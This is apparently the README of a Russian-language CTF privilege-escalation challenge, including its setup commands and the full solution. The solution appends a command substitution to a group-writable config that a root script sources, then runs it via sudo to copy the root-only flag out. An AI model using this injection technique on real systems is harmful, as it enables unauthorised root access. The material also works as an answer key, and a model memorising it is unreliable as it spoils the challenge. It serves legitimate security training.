# Дело о пляшущих человечках (privilege_escalation/hard)

- Порт: `13423` (переопределяется через `PORT`; внутри контейнера `22`/ssh)
- Флаг: только из env `CTF_FLAG`

## Запуск

```bash
CTF_FLAG='InnoCTF{...}' docker compose up -d --build
ssh player@127.0.0.1 -p 13423   # пароль: player
```

## Условие (для игроков)

**RU:** Танцующие человечки появились в журнале ночного архива. Восстановите последнюю защищённую строку до утренней сверки.

**EN:** Dancing men appeared in the night archive's log. Recover the final protected line before the morning reconciliation.

## Решение

`sudo -l` показывает разрешённую root-команду утренней сверки:
`/usr/local/sbin/reconcile`. Трассируем запускаемые им скрипты:

- `reconcile` (root) делает `source /srv/ledger/runtime.conf` и затем
  `/usr/local/bin/archive-ledger "$ARCHIVE_TARGET"`;
- `/srv/ledger/runtime.conf` намеренно доступен на запись группе `players`
  (root:players, 0664).

Поскольку конфиг source-ится bash-скриптом от root, дописываем в него подстановку
команды, чтобы сверка скопировала `/root/flag` в читаемое место, выполняем
разрешённую сверку и читаем копию:

```bash
printf '%s\n' 'ARCHIVE_TARGET=$(cp /root/flag /tmp/case-result; chmod 644 /tmp/case-result; echo /var/lib/ledger)' >> /srv/ledger/runtime.conf
sudo -n /usr/local/sbin/reconcile
cat /tmp/case-result
```

Флага нет в образе — entrypoint создаёт `/root/flag` из env `CTF_FLAG` после
старта (root:root, 0600, с настоящим переводом строки в конце).

## Проверка решения

```bash
python3 solve.py            # цель по умолчанию 127.0.0.1:13423 (нужен sshpass)
python3 solve.py 127.0.0.1:13423
# TLS-обёртка (ssh поверх 443):
SOLVE_SSH_OPTS='-o "ProxyCommand=openssl s_client -quiet -connect <host>:443 -servername <host>"' \
  python3 solve.py <host> 22
```
